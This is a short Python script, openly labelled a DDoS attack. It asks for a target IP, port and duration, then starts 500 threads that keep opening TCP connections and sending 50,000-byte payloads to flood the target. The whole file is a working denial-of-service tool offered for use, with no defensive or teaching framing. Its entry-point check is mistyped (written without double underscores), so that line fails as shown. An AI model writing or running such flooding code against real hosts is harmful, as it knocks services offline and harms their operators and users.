import socket
import threading
import time

def send_tcp_packets(ip, port):
    # Craft a larger packet
    payload = b'X' * 50000  # Adjust the packet size as needed

    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            
            # Send the larger packet
            s.sendall(payload)
            
            # Close the socket
            s.close()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")

def ddos_attack(ip, port, duration):
    # Convert duration to seconds
    duration = int(duration)
    
    # Start threads for sending packets
    threads = []
    for _ in range(500):  # Adjust the number of threads as needed
        t = threading.Thread(target=send_tcp_packets, args=(ip, port))
        t.daemon = True
        threads.append(t)
        t.start()

    # Run the attack for the specified duration
    time.sleep(duration)

if name == "main":
    ip = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    duration = int(input("Enter the attack duration (in seconds): "))

    ddos_attack(ip, port, duration)